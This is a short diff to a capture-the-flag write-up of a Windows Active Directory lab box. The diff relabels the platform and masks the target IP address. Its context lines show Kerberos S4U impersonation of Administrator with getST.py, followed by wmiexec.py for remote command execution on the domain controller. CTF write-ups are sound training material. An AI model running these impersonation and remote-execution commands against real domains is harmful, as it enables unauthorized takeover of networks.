@@ -1,4 +1,4 @@
-# Bruno — Vulnlab, Windows / AD
+# Bruno — Hack The Box, Windows / AD
 
 A Windows domain controller that runs a small "sample scanner" web app and an
 enterprise CA. The intended chain turns a read-only anonymous FTP share into
@@ -77,7 +77,7 @@ standard S4U:
 
 ```
 getST.py -spn cifs/brunodc.bruno.vl -impersonate Administrator \
-    -dc-ip 10.129.238.9 'bruno.vl/<pc>$:<pw>'
+    -dc-ip 10.129.x.x 'bruno.vl/<pc>$:<pw>'
 KRB5CCNAME=Administrator@cifs_brunodc.bruno.vl@BRUNO.VL.ccache \
     wmiexec.py -k -no-pass brunodc.bruno.vl
 ```
